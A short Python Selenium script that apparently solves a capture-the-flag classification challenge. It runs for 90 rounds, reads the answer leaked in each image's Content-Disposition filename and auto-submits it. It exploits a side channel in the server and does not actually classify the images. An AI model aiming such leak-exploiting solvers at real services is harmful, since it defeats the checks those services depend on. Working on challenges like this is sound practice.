import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import Select
from webdriver_manager.chrome import ChromeDriverManager

# Set up the WebDriver
options = webdriver.ChromeOptions()
options.add_argument('--headless')  # Run in headless mode if you don't need a GUI
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

url = "http://34.107.71.117:30921/"
driver.get(url)

for i in range(0,90):
    image = driver.find_element(By.TAG_NAME, 'img')
    src = image.get_attribute('src')
    headers = {
        'Cookie': f'user_challenges={driver.get_cookie('user_challenges')['value']}'
    }
    response = requests.get(src, headers=headers, stream=True)
    content_disposition = response.headers['Content-Disposition']
    file_name = content_disposition.split('filename=')[-1].strip('"')
    if file_name.split('_')[2] == 'M':
        choice = 'M'
    else:
        choice = 'F'
    select = Select(driver.find_element(By.ID, 'label'))
    select.select_by_value(choice)
    driver.find_element(By.XPATH, '//form').submit()
    print(driver.page_source)

# Close the WebDriver session
driver.quit()